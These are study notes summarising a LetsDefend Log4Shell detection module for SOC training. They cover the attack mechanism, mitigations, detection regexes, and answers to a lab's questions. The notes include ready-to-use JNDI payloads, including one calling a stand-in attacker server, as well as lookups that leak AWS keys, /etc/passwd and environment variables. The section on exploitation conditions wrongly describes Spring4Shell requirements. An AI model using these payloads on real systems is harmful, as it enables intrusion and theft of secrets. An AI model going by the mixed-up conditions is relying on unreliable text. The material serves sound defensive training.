# LetsDefend: Detecting Log4Shell Attack Module Summary 

**Table of Contents:** 

- Introduction to Log4Shell
- Technical Details
- Check If You’re Vulnerable
- Mitigation for Log4Shell
- SOC Analyst Perspective

All have been summarized in one page

You can practice this vulnerability from this challenge → https://tryhackme.com/room/solar

### **1. Overview**

The **Log4Shell** vulnerability exploits a flaw in **Apache Log4j (versions 2.0–2.14.1)** that allows **remote code execution (RCE)**. It abuses the **JNDI (Java Naming and Directory Interface)** lookup feature, which lets Log4j fetch data from external services like **LDAP(Lightweight Directory Access Protocol)**, **RMI**, or **DNS**.

When Log4j logs attacker-controlled input containing a malicious `${jndi:...}` reference, it connects to the attacker’s server, retrieves and deserializes a malicious Java object, and executes it.

---

### **2. How Exploitation Works**

1. Attacker crafts a log message with a JNDI lookup payload such as:
    
    `${jndi:ldap://attacker-server.com/a}`
    
2. The vulnerable Log4j instance processes the log entry.
3. It performs a remote lookup to the attacker's LDAP/RMI/DNS server.
4. The attacker’s server returns a malicious serialized Java class.
5. Log4j deserializes and executes it, leading to **RCE**.

---

### **3. Impact**

- **Remote Code Execution:** Full system compromise possible.
- **Privilege Escalation:** Attacker can gain root/admin rights.
- **Data Exfiltration:** Credentials, tokens, and environment variables can be stolen.
- **Cloud Exposure:** Attackers can extract secrets like AWS keys.

---

### **4. Example Payloads**

Common payloads used to detect or exploit Log4Shell:

1. **`${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (utilizing canarytokens.com)**
2. **`${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}`(using interactsh)**
3. **`${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (using Burp Suite)**
4. **`${jndi:ldap://2j4ayo.dnslog.cn}` (using dnslog)**
5. **`${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (using huntress)**

```
${jndi:ldap://x${hostName}.canarytokens.com/a}
${jndi:ldap://<your>.interact.sh}
${jndi:ldap://<your>.burpcollaborator.net}
```

These payloads often generate **DNS callbacks** to confirm vulnerability presence.

---

### **5. Information Exfiltration Payloads**

Attackers can leak:

- `${env:AWS_ACCESS_KEY_ID}` — Environment variables
- `${sys:os.name}` — System properties
- `${file:/etc/passwd}` — File contents
- `${java:version}` — Java details

---

### **6. Conditions for Successful Exploitation**

For the attack to work:

- Java Development Kit 9+
- Apache Tomcat as servlet container
- Deployed as WAR file
- Uses `spring-webmvc` or `spring-webflux`
- Spring versions 5.3.0–5.3.17 or 5.2.0–5.2.19

---

### **7. Detection**

Monitor logs for suspicious patterns such as:

```
${jndi:ldap:/      ${jndi:rmi:/      ${jndi:ldaps:/
${jndi:dns:/       %24%7bjndi:       %2524%257Bjndi
```

**Grep example for Nginx logs:**

```bash
grep -P '(\$\{?jndi:(ldap|rmi|ldaps|dns):\/|%24%7Bjndi|%2524%257Bjndi)' /var/log/nginx/access.log
```

These patterns detect both raw and encoded payloads targeting headers, POST data, or URLs.

---

### **8. Mitigation**

- **Update Log4j:** Upgrade to 2.17.1+
- **Upgrade Frameworks:**
    - Spring Framework → 5.3.18 / 5.2.20
    - Apache Tomcat → 10.0.20 / 9.0.62 / 8.5.78
    - Spring Boot → 2.5.12 / 2.6.6
- **If update not possible:**
    - Disable JNDI lookups: `log4j2.formatMsgNoLookups=true`
    - Use a Web Application Firewall (WAF) to block `${jndi:` patterns.

---

### **9. SOC Analyst Perspective**

- Watch for outbound LDAP/DNS/RMI traffic from internal servers.
- Monitor HTTP headers like **User-Agent**, **Referer**, and **X-Forwarded-For** for payloads.
- Correlate log entries with DNS lookup events to external domains.
- Use SIEM detection rules for `${jndi:*}` patterns.
- Investigate any network beacons to suspicious domains (e.g., CanaryTokens, Interact.sh).

To search for Log4Shell-related patterns in Nginx logs, you can use regular expressions or specific keywords to filter the log entries. Here's a regular expression that combines all the Log4Shell-related patterns:

```
/(\$\{?jndi:ldap:\/|\$\{?jndi:rmi:\/|\$\{?jndi:ldaps:\/|\$\{?jndi:dns:\/|\/\$%7bjndi:|\*%24%7bjndi:|\*$%7Bjndi:|\*%2524%257Bjndi|\*%2F%252524%25257Bjndi%3A|\$\{?jndi:${lower:|\$\{?:-j}\$\{?|\$\{?jndi:iiop|\$\{?:-l}\$\{?:-d}\$\{?:-a}\$\{?:-p}|\$\{?base64:JHtqbmRp)/gm
```

**Example Nginx Log**

![](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Detecting-Log4Shell-Attack/carbon+(2).png)

This log entry represents a GET request from IP address `192.168.1.100` to the `/index.html` page. The server responds with a 200 status code, indicating a successful request. The size of the response is 612 bytes. The User-Agent field is set to "`*${jndi:ldap:/*}`", which suggests a potential Log4Shell attack.

![](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Detecting-Log4Shell-Attack/carbon+(3).png)

This log entry represents a GET request from IP address `10.0.2.50`to the `/search.php` page. The query string `q=*` is appended with an attacking parameter `jndi=ldap%3A%2F%2F${java:version}.exampledomain.com%2Fa`, indicating a potential Log4Shell attack. In this case, the attack attempts to use the `java:version` variable to perform a JNDI LDAP lookup. The server responds with a 200 status code, indicating a successful request.

![](https://letsdefend-images.s3.us-east-2.amazonaws.com/Courses/Detecting-Log4Shell-Attack/carbon+(4).png)

This log entry represents a GET request from IP address `10.0.2.50` to the `/search.php` page. The query string `q=*` is appended with an attacking parameter `jndi=ldap%3A%2F%2F${env:AWS_ACCESS_KEY_ID}.exampledomain.com%2Fa`, indicating a potential Log4Shell attack. In this case, the attack attempts to use the `AWS_ACCESS_KEY_ID` environment variable to perform a JNDI LDAP lookup.

**Q&A:**

**File Location: `/root/Desktop/QuestionFiles/access.log`

Q1. What is the DNS server for detecting Log4Shell?**

```bash
grep "jndi\:ldap\:" access.log
```

<img width="1258" height="166" alt="image" src="https://github.com/user-attachments/assets/e2346b1e-d2a8-4a7e-a026-9cc9fce71be9" />

*Ans: kadev.me*

**Q2. What was the environment variable that the attacker used on the payload?**

*Ans: java_Version*
****

**Q3. Which header was attacked by Hacker?**

*Ans: user-agent*

### **10. Conclusion**

In conclusion, Log4Shell poses a significant security risk due to its potential for remote code execution and data exfiltration. SOC teams and security professionals should be vigilant and pay close attention to specific keywords indicative of Log4Shell attacks. These keywords include "`${jndi:ldap:/`", "`${jndi:rmi:/`", "`${jndi:ldaps:/`", "`${jndi:dns:/`", "`/$%7bjndi:`", "`%24%7bjndi:`", "`$%7Bjndi:`", "`%2524%257Bjndi`", "`%2F%252524%25257Bjndi%3A`", and other variations.

By actively monitoring logs, including web server logs such as Nginx, and using intrusion detection systems (IDS), security teams can detect and respond to potential Log4Shell attacks promptly. Additionally, implementing proper mitigation measures, such as applying patches and configuration changes, is essential to protect systems against this vulnerability.

It is crucial to stay up to date with the latest security advisories and patches released by relevant software vendors and actively communicate with the development and operations teams to ensure a coordinated response. By staying vigilant and taking proactive measures, organizations can minimize the risk associated with Log4Shell and safeguard their infrastructure from potential exploitation.
